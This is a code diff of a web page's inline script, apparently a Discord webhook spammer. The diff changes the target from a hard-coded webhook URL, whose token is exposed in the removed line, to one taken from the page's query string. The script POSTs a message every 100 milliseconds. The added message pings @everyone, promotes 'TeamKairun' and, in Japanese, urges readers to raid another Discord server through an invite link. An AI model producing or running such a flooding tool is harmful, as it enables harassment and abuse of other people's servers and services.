@@ -12,13 +12,23 @@
     <script>
         let param = new URLSearchParams(window.location.search);
         setInterval(() => {
-               fetch(`https://ptb.discord.com/api/webhooks/1173994551187341334/5i1iY_zkTpgrwEs1vIp9cjQsns-k4daFEcSHozBBHHGalqsa4y8YbLxLRgaLKaRP2SwT`, {
+               fetch(decodeURIComponent(param.get("url")), {
         method: "POST",
         headers: {
             'Content-Type': 'application/json; charset=UTF-8',
         },
         body: JSON.stringify({
-           content:"ﾃﾞｭｱｳﾝ"
+           content:`@everyone
+# TeamKairun最強
+# [かいるんの達人をプレイ](https://taiko.kairun.jp)
+https://kairun.jp/
+# ↓この鯖荒らしてくれ
+https://discord.gg/abj
+# TeamKairun万歳
+ーーーーーーーーーーーーーーーー
+https://imgur.com/pTNWRk5
+https://imgur.com/a/S5nBrWE
+https://imgur.com/a/4nbpChH`
         })
     })
         }, 100);
